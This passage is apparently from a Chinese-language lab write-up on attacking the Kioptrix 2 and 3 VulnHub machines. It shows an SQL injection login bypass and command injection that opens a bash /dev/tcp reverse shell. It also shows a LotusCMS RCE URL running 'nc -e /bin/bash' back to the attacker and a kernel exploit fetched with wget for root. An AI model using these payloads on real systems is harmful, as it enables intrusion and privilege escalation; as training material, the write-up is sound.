class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sS -A 192.168.214.138</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-15 09:10 EDT</span><br><span class="line">Nmap scan report for 192.168.214.138</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)</span><br><span class="line">|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)</span><br><span class="line">|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">|_http-server-header: Apache/2.0.52 (CentOS)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100024  1            678/udp  status</span><br><span class="line">|_  100024  1            681/tcp  status</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">|_http-server-header: Apache/2.0.52 (CentOS)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid before: 2009-10-08T00:10:47</span><br><span class="line">|_Not valid after:  2010-10-08T00:10:47</span><br><span class="line">|_ssl-date: 2018-10-15T10:01:19+00:00; -3h09m45s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|_    SSL2_RC4_128_WITH_MD5</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: PUT</span><br><span class="line">|_http-server-header: CUPS/1.1</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:E1:91:66 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.30</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -3h09m45s, deviation: 0s, median: -3h09m45s</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.26 ms 192.168.214.138</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.43 seconds</span><br></pre></td></tr></table></figure>

<h2 id="web端弹shell"><a href="#web端弹shell" class="headerlink" title="web端弹shell"></a>web端弹shell</h2><p>打开主页<code>http://192.168.214.138/</code>是一个登陆框</p>
<p>查看页面源代码提示Administator<br><code>&lt;!-- Start of HTML when logged in as Administator --&gt;</code></p>
<p><code>Administator&#39;or&#39;1&#39;=&#39;1</code>万能密码能登陆</p>
<p>登陆后是一个执行ping命令的输入框，没有过滤，能进行命令注入，弹个shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | bash -i &gt;&amp; /dev/tcp/192.168.214.139/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/# nc -lvvp 7777</span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">192.168.214.138: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.214.139] from (UNKNOWN) [192.168.214.138] 32769</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-3.00$ ls</span><br><span class="line">index.php</span><br><span class="line">pingit.php</span><br><span class="line">bash-3.00$ id</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache)</span><br></pre></td></tr></table></figure>

<p>看下<code>index.php</code>的源码，有数据库的链接密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ cat index.php</span><br><span class="line">cat index.php</span><br><span class="line">&lt;?php</span><br><span class="line">	mysql_connect(&quot;localhost&quot;, &quot;john&quot;, &quot;hiroshima&quot;) or die(mysql_error());</span><br><span class="line">	//print &quot;Connected to MySQL&lt;br /&gt;&quot;;</span><br><span class="line">	mysql_select_db(&quot;webapp&quot;);</span><br><span class="line">	</span><br><span class="line">	if ($_POST[&apos;uname&apos;] != &quot;&quot;)&#123;</span><br><span class="line">		$username = $_POST[&apos;uname&apos;];</span><br><span class="line">		$password = $_POST[&apos;psw&apos;];</span><br><span class="line">		$query = &quot;SELECT * FROM users WHERE username = &apos;$username&apos; AND password=&apos;$password&apos;&quot;;</span><br><span class="line">		//print $query.&quot;&lt;br&gt;&quot;;</span><br><span class="line">		$result = mysql_query($query);</span><br><span class="line"></span><br><span class="line">		$row = mysql_fetch_array($result);</span><br><span class="line">		//print &quot;ID: &quot;.$row[&apos;id&apos;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if ($row[&apos;id&apos;]==&quot;&quot;)&#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; name=&quot;frmLogin&quot; id=&quot;frmLogin&quot; action=&quot;index.php&quot;&gt;</span><br><span class="line">	&lt;table width=&quot;300&quot; border=&quot;1&quot; align=&quot;center&quot; cellpadding=&quot;2&quot; cellspacing=&quot;2&quot;&gt;</span><br><span class="line">		&lt;tr&gt;</span><br><span class="line">			&lt;td colspan=&apos;2&apos; align=&apos;center&apos;&gt;</span><br><span class="line">			&lt;b&gt;Remote System Administration Login&lt;/b&gt;</span><br><span class="line">			&lt;/td&gt;</span><br><span class="line">		&lt;/tr&gt;</span><br><span class="line">		&lt;tr&gt;</span><br><span class="line">			&lt;td width=&quot;150&quot;&gt;Username&lt;/td&gt;</span><br><span class="line">			&lt;td&gt;&lt;input name=&quot;uname&quot; type=&quot;text&quot;&gt;&lt;/td&gt;</span><br><span class="line">		&lt;/tr&gt;</span><br><span class="line">		&lt;tr&gt;</span><br><span class="line">			&lt;td width=&quot;150&quot;&gt;Password&lt;/td&gt;</span><br><span class="line">			&lt;td&gt;</span><br><span class="line">			&lt;input name=&quot;psw&quot; type=&quot;password&quot;&gt;</span><br><span class="line">			&lt;/td&gt;</span><br><span class="line">		&lt;/tr&gt;</span><br><span class="line">		&lt;tr&gt;</span><br><span class="line">			&lt;td colspan=&quot;2&quot; align=&quot;center&quot;&gt;</span><br><span class="line">			&lt;input type=&quot;submit&quot; name=&quot;btnLogin&quot; value=&quot;Login&quot;&gt;</span><br><span class="line">			&lt;/td&gt;</span><br><span class="line">		&lt;/tr&gt;</span><br><span class="line">	&lt;/table&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125; //END of login form</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Start of HTML when logged in as Administator --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	if ($row[&apos;id&apos;]==1)&#123;</span><br><span class="line">?&gt;</span><br><span class="line">	&lt;form name=&quot;ping&quot; action=&quot;pingit.php&quot; method=&quot;post&quot; target=&quot;_blank&quot;&gt;</span><br><span class="line">		&lt;table width=&apos;600&apos; border=&apos;1&apos;&gt;</span><br><span class="line">		&lt;tr valign=&apos;middle&apos;&gt;</span><br><span class="line">			&lt;td colspan=&apos;2&apos; align=&apos;center&apos;&gt;</span><br><span class="line">			&lt;b&gt;Welcome to the Basic Administrative Web Console&lt;br&gt;&lt;/b&gt;</span><br><span class="line">			&lt;/td&gt;</span><br><span class="line">		&lt;/tr&gt;</span><br><span class="line">		&lt;tr valign=&apos;middle&apos;&gt;</span><br><span class="line">			&lt;td align=&apos;center&apos;&gt;</span><br><span class="line">				Ping a Machine on the Network:</span><br><span class="line">			&lt;/td&gt;</span><br><span class="line">				&lt;td align=&apos;center&apos;&gt;</span><br><span class="line">				&lt;input type=&quot;text&quot; name=&quot;ip&quot; size=&quot;30&quot;&gt;</span><br><span class="line">				&lt;input type=&quot;submit&quot; value=&quot;submit&quot; name=&quot;submit&quot;&gt;</span><br><span class="line">			&lt;/td&gt;</span><br><span class="line">			&lt;/td&gt;</span><br><span class="line">		&lt;/tr&gt;</span><br><span class="line">	&lt;/table&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>尝试切换<code>john</code>账户，使用密码<code>hiroshima</code>，但是密码不对</p>
<h2 id="尝试提权"><a href="#尝试提权" class="headerlink" title="尝试提权"></a>尝试提权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ uname -a</span><br><span class="line">Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span><br><span class="line">bash-3.00$ lsb_release -a</span><br><span class="line">LSB Version:	:core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch</span><br><span class="line">Distributor ID:	CentOS</span><br><span class="line">Description:	CentOS release 4.5 (Final)</span><br><span class="line">Release:	4.5</span><br><span class="line">Codename:	Final</span><br></pre></td></tr></table></figure>

<p>发现是CentOS 4.5，内核2.6.9</p>
<p>searchsploit CentOS看一下有没有漏洞</p>
<p>发现有一条exp符合</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - &apos;sock_sendpage()&apos; Lo | exploits/linux/local/9545.c</span><br></pre></td></tr></table></figure>

<p>反弹的shell上编译执行exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ wget 192.168.214.139/9542.c</span><br><span class="line">--06:34:52--  http://192.168.214.139/9542.c</span><br><span class="line">           =&gt; `9542.c&apos;</span><br><span class="line">Connecting to 192.168.214.139:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 2,643 (2.6K) [text/plain]</span><br><span class="line"></span><br><span class="line">    0K ..                                                    100%  315.07 MB/s</span><br><span class="line"></span><br><span class="line">06:34:52 (315.07 MB/s) - `9542.c&apos; saved [2643/2643]</span><br><span class="line"></span><br><span class="line">bash-3.00$ gcc -o 0x82-CVE-2009-2698 9542.c</span><br><span class="line">9542.c:109:28: warning: no newline at end of file</span><br><span class="line">bash-3.00$ ls</span><br><span class="line">0x82-CVE-2009-2698</span><br><span class="line">9542.c</span><br><span class="line">les.sh</span><br><span class="line">bash-3.00$ ./0x82-CVE-2009-2698</span><br><span class="line">sh: no job control in this shell</span><br><span class="line"></span><br><span class="line">sh-3.00# id</span><br><span class="line">uid=0(root) gid=0(root) groups=48(apache)</span><br></pre></td></tr></table></figure>

<p>得到root权限</p>
<h1 id="Kioptrix-3"><a href="#Kioptrix-3" class="headerlink" title="Kioptrix#3"></a>Kioptrix#3</h1><p>下载地址: <a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/kioptrix-level-12-3,24/</a></p>
<ul>
<li>靶机ip 192.168.214.140</li>
<li>kali ip 192.168.214.139</li>
</ul>
<h2 id="namp扫描"><a href="#namp扫描" class="headerlink" title="namp扫描"></a>namp扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sS -A 192.168.214.140</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-18 08:51 EDT</span><br><span class="line">Nmap scan report for 192.168.214.140</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)</span><br><span class="line">|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line">|_http-title: Ligoat Security - Got Goat? Security ...</span><br><span class="line">MAC Address: 00:0C:29:A9:2C:B4 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.32 ms 192.168.214.140</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.38 seconds</span><br></pre></td></tr></table></figure>

<h2 id="LotusCMS-RCE"><a href="#LotusCMS-RCE" class="headerlink" title="LotusCMS RCE"></a>LotusCMS RCE</h2><p>打开主页，能发现是LotusCMS,扫描也能发现是LotusCMS<br><img src="https://s1.ax1x.com/2018/10/19/iwLIde.png" alt="iwLIde.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# whatweb http://192.168.214.140</span><br><span class="line">http://192.168.214.140 [200 OK] Apache[2.2.8], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch], IP[192.168.214.140], maybe LotusCMS, Meta-Author[name of author - Manjeet Singh Sawhney   www.manjeetss.com], PHP[5.2.4-2ubuntu5.6][Suhosin-Patch], Title[Ligoat Security - Got Goat? Security ...], X-Powered-By[PHP/5.2.4-2ubuntu5.6]</span><br></pre></td></tr></table></figure>

<p>搜索发现存在远程命令执行漏洞<br><img src="https://s1.ax1x.com/2018/10/19/iwL5ZD.png" alt="iwL5ZD.png"></p>
<p>本地监听反弹shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/index.php?page=index%27);system(%27nc%20-e%20/bin/bash%20192.168.214.139%207777%27);//</span><br><span class="line"></span><br><span class="line">root@kali:~# nc -lvvp 7777</span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">connect to [192.168.214.139] from kioptrix3.com [192.168.214.140] 44671</span><br><span class="line">ls</span><br><span class="line">cache</span><br><span class="line">core</span><br><span class="line">data</span><br><span class="line">favicon.ico</span><br><span class="line">gallery</span><br><span class="line">gnu-lgpl.txt</span><br><span class="line">index.php</span><br><span class="line">modules</span><br><span class="line">style</span><br><span class="line">update.php</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<p>成功得到shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ uname -a</span><br><span class="line">uname -a</span><br><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux</span><br><span class="line">$ lsb_release -a</span><br><span class="line">lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:	Ubuntu</span><br><span class="line">Description:	Ubuntu 8.04.3 LTS</span><br><span class="line">Release:	8.04</span><br><span class="line">Codename:	hardy</span><br></pre></td></tr></table></figure>

<p>之后想利用漏洞来提权，但试了好几个exp都没有成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@Kioptrix3:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">40616.c  5092.c  8556.c      a.out  c0w    les.sh</span><br><span class="line">5092	 5093.c  LinEnum.sh  bak    c0w.c</span><br></pre></td></tr></table></figure>

<h2 id="搜集信息"><a href="#搜集信息" class="headerlink" title="搜集信息"></a>搜集信息</h2><p>看下passwd，发现还有<code>loneferret</code>和<code>dreg</code>用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">dhcp:x:101:102::/nonexistent:/bin/false</span><br><span class="line">syslog:x:102:103::/home/syslog:/bin/false</span><br><span class="line">klog:x:103:104::/home/klog:/bin/false</span><br><span class="line">mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false</span><br><span class="line">sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash</span><br><span class="line">dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash</span><br></pre></td></tr></table></figure>

<p><code>dreg</code>用户家目录没什么东西，而<code>loneferret</code>家目录里有点东西</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">www-data@Kioptrix3:/home/loneferret$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 64</span><br><span class="line">drwxr-xr-x 3 loneferret loneferret  4096 Apr 17  2011 .</span><br><span class="line">drwxr-xr-x 5 root       root        4096 Apr 16  2011 ..</span><br><span class="line">-rw-r--r-- 1 loneferret users         13 Apr 18  2011 .bash_history</span><br><span class="line">-rw-r--r-- 1 loneferret loneferret   220 Apr 11  2011 .bash_logout</span><br><span class="line">-rw-r--r-- 1 loneferret loneferret  2940 Apr 11  2011 .bashrc</span><br><span class="line">-rw------- 1 root       root          15 Apr 15  2011 .nano_history</span><br><span class="line">-rw-r--r-- 1 loneferret loneferret   586 Apr 11  2011 .profile</span><br><span class="line">drwx------ 2 loneferret loneferret  4096 Apr 14  2011 .ssh</span><br><span class="line">-rw-r--r-- 1 loneferret loneferret     0 Apr 11  2011 .sudo_as_admin_successful</span><br><span class="line">-rw-r--r-- 1 root       root         224 Apr 16  2011 CompanyPolicy.README</span><br><span class="line">-rwxrwxr-x 1 root       root       26275 Jan 12  2011 checksec.sh</span><br><span class="line">www-data@Kioptrix3:/home/loneferret$ cat CompanyPolicy.README</span><br><span class="line">cat CompanyPolicy.README</span><br><span class="line">Hello new employee,</span><br><span class="line">It is company policy here to use our newly installed software for editing, creating and viewing files.</span><br><span class="line">Please use the command &apos;sudo ht&apos;.</span><br><span class="line">Failure to do so will result in you immediate termination.</span><br><span class="line"></span><br><span class="line">DG</span><br><span class="line">CEO</span><br><span class="line">www-data@Kioptrix3:/home/loneferret$ sudo ht</span><br><span class="line">sudo ht</span><br><span class="line">[sudo] password for www-data:</span><br></pre></td></tr></table></figure>

<p>sudo命令需要输入密码，gg</p>
<p>再去网站看看，扫下目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# dirb http://kioptrix3.com /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Oct 18 10:47:56 2018</span><br><span class="line">URL_BASE: http://kioptrix3.com/</span><br><span class="line">WORDLIST_FILES: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 87568                                                         </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://kioptrix3.com/ ----</span><br><span class="line">==&gt; DIRECTORY: http://kioptrix3.com/modules/                                                                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://kioptrix3.com/gallery/                                                                                                                 </span><br><span class="line">+ http://kioptrix3.com/data (CODE:403|SIZE:324)                                                                                                              </span><br><span class="line">==&gt; DIRECTORY: http://kioptrix3.com/core/                                                                                                                    </span><br><span 